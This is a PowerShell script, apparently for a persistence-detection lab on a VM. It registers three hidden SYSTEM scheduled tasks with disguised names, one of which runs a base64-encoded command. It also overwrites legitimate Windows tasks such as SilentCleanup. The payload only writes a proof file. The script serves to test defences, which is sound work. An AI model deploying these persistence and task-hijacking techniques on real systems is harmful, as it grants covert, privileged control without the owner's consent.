$taskPath = '\PersistenceShowdownLab\'
$workDir = Join-Path $env:ProgramData 'PersistenceShowdownLab\ScheduledTasks'
$payloadPath = 'C:\Users\Public\Documents\pwned.txt'
$payloadText = 'Pwn3d'
$psExe = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
$cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
$wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'

$newTaskNames = @(
    'PSUnit-Startup-ProfileCache',
    'PSUnit-Logon-CloudSync',
    'PSUnit-Startup-WinUpdateCache'
)

$existingTaskCandidates = @(
    [ordered]@{ TaskPath = '\Microsoft\Windows\Application Experience\'; TaskName = 'ProgramDataUpdater' },
    [ordered]@{ TaskPath = '\Microsoft\Windows\Customer Experience Improvement Program\'; TaskName = 'Consolidator' },
    [ordered]@{ TaskPath = '\Microsoft\Windows\DiskCleanup\'; TaskName = 'SilentCleanup' },
    [ordered]@{ TaskPath = '\Microsoft\Windows\Windows Error Reporting\'; TaskName = 'QueueReporting' },
    [ordered]@{ TaskPath = '\Microsoft\Windows\Maintenance\'; TaskName = 'WinSAT' },
    [ordered]@{ TaskPath = '\Microsoft\Windows\Maps\'; TaskName = 'MapsUpdateTask' }
)

function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }

function Invoke-ScheduledTaskAttempt {
    param([string]$Name, [scriptblock]$ScriptBlock)

    try {
        & $ScriptBlock
    } catch {
        Write-Warn "Scheduled task attempt '$Name' failed: $_"
    }
}

function Get-TaskIdentity {
    param([string]$Path, [string]$Name)
    if (-not $Path.EndsWith('\')) { $Path += '\' }
    return "$Path$Name"
}

function Remove-NewLabTasks {
    foreach ($name in $newTaskNames) {
        try {
            Unregister-ScheduledTask -TaskName $name -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
            & schtasks.exe /Delete /TN "$taskPath$name" /F 2>$null | Out-Null
        } catch {}
    }
}

function New-PayloadScript {
    param([string]$Path, [int]$DelaySeconds = 0)

    $content = @"
`$ErrorActionPreference = 'SilentlyContinue'
if ($DelaySeconds -gt 0) { Start-Sleep -Seconds $DelaySeconds }
New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null
Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII
"@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
}

function New-PayloadVbs {
    param([string]$Path)

    $content = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists("C:\Users\Public\Documents") Then
    fso.CreateFolder("C:\Users\Public\Documents")
End If
Set f = fso.CreateTextFile("C:\Users\Public\Documents\pwned.txt", True)
f.Write "Pwn3d"
f.Close
'@
    Set-Content -LiteralPath $Path -Value $content -Encoding ASCII -ErrorAction Stop
}

function New-EncodedPayload {
    $command = "New-Item -ItemType Directory -Path 'C:\Users\Public\Documents' -Force | Out-Null; Set-Content -LiteralPath 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -NoNewline -Encoding ASCII"
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
}

function Register-LabTask {
    param(
        [string]$Path,
        [string]$Name,
        [string]$Description,
        $Action,
        $Trigger,
        [switch]$Hidden
    )

    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settingsArgs = @{
        AllowStartIfOnBatteries = $true
        DontStopIfGoingOnBatteries = $true
        StartWhenAvailable = $true
        MultipleInstances = 'IgnoreNew'
        ExecutionTimeLimit = (New-TimeSpan -Minutes 5)
    }
    if ($Hidden) { $settingsArgs['Hidden'] = $true }
    $settings = New-ScheduledTaskSettingsSet @settingsArgs

    Register-ScheduledTask -TaskName $Name -TaskPath $Path -Action $Action -Trigger $Trigger -Principal $principal -Settings $settings -Description $Description -Force -ErrorAction Stop | Out-Null
    Write-OK "Registered $(Get-TaskIdentity $Path $Name)"
}

function Get-HijackTargets {
    $targets = @()
    foreach ($candidate in $existingTaskCandidates) {
        try {
            $task = Get-ScheduledTask -TaskPath $candidate.TaskPath -TaskName $candidate.TaskName -ErrorAction Stop
            if ($null -ne $task) {
                $targets += $candidate
                if ($targets.Count -ge 2) { break }
            }
        } catch {}
    }
    return @($targets)
}

Write-Step "Preparing scheduled task helper files"
$profileCacheScript = Join-Path $workDir 'profile-cache.ps1'
$delayedScript = Join-Path $workDir 'userinit-bridge.ps1'
$vbsScript = Join-Path $workDir 'event-cache.vbs'
$helpersReady = $false
try {
    New-Item -ItemType Directory -Path $workDir -Force -ErrorAction Stop | Out-Null
    New-PayloadScript -Path $profileCacheScript
    New-PayloadScript -Path $delayedScript -DelaySeconds 20
    New-PayloadVbs -Path $vbsScript
    $helpersReady = $true
    Write-OK "Helper files written to $workDir"
} catch {
    Write-Warn "Could not prepare scheduled task helper files: $_"
}

Write-Step "Removing previous lab-owned new tasks"
try {
    Remove-NewLabTasks
    Write-OK "Removed lab-owned new tasks if present"
} catch {
    Write-Warn "Could not remove previous lab-owned new tasks: $_"
}

Write-Step "Installing 3 new scheduled task persistence variants"
$encoded = ''
try {
    $encoded = New-EncodedPayload
} catch {
    Write-Warn "Could not generate encoded scheduled task payload: $_"
}

Invoke-ScheduledTaskAttempt 'PSUnit-Startup-ProfileCache' {
    if (-not $helpersReady) { throw 'helper files were not prepared' }
    Register-LabTask `
        -Path $taskPath `
        -Name 'PSUnit-Startup-ProfileCache' `
        -Description 'Lab test: new hidden SYSTEM startup task that launches a ProgramData PowerShell helper.' `
        -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`"" -WorkingDirectory $workDir) `
        -Trigger (New-ScheduledTaskTrigger -AtStartup) `
        -Hidden
}

Invoke-ScheduledTaskAttempt 'PSUnit-Logon-CloudSync' {
    Register-LabTask `
        -Path $taskPath `
        -Name 'PSUnit-Logon-CloudSync' `
        -Description 'Lab test: new logon task using cmd.exe to write the project proof file.' `
        -Action (New-ScheduledTaskAction -Execute $cmdExe -Argument "/c echo $payloadText>$payloadPath") `
        -Trigger (New-ScheduledTaskTrigger -AtLogOn)
}

Invoke-ScheduledTaskAttempt 'PSUnit-Startup-WinUpdateCache' {
    if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
    Register-LabTask `
        -Path $taskPath `
        -Name 'PSUnit-Startup-WinUpdateCache' `
        -Description 'Lab test: new hidden startup task using an encoded PowerShell command.' `
        -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded") `
        -Trigger (New-ScheduledTaskTrigger -AtStartup) `
        -Hidden
}

Write-Step "Overwriting 2 existing scheduled task names"
$targets = @(Get-HijackTargets)
if ($targets.Count -lt 2) {
    Write-Warn "Only found $($targets.Count) existing task candidate(s). The script will overwrite what it found."
}

$i = 0
foreach ($target in $targets) {
    try {
        if ($i -eq 0) {
            if (-not $helpersReady) { throw 'helper files were not prepared' }
            Register-LabTask `
                -Path $target.TaskPath `
                -Name $target.TaskName `
                -Description 'Lab test: existing Windows task name overwritten with a PowerShell helper action.' `
                -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$delayedScript`"" -WorkingDirectory $workDir) `
                -Trigger (New-ScheduledTaskTrigger -AtStartup) `
                -Hidden
        } else {
            if (-not $helpersReady) { throw 'helper files were not prepared' }
            Register-LabTask `
                -Path $target.TaskPath `
                -Name $target.TaskName `
                -Description 'Lab test: existing Windows task name overwritten with Windows Script Host action.' `
                -Action (New-ScheduledTaskAction -Execute $wscriptExe -Argument "//B `"$vbsScript`"" -WorkingDirectory $workDir) `
                -Trigger (New-ScheduledTaskTrigger -AtStartup)
        }
        $i++
    } catch {
        Write-Warn "Could not overwrite $(Get-TaskIdentity $target.TaskPath $target.TaskName): $_"
    }
}

Write-Host ""
Write-Host "[DONE] Installed scheduled task unit-test persistences." -ForegroundColor Green
Write-Host "Created 3 new tasks and attempted to overwrite 2 existing task candidates." -ForegroundColor Yellow
Write-Host "Revert the VMware snapshot to restore the VM." -ForegroundColor Yellow
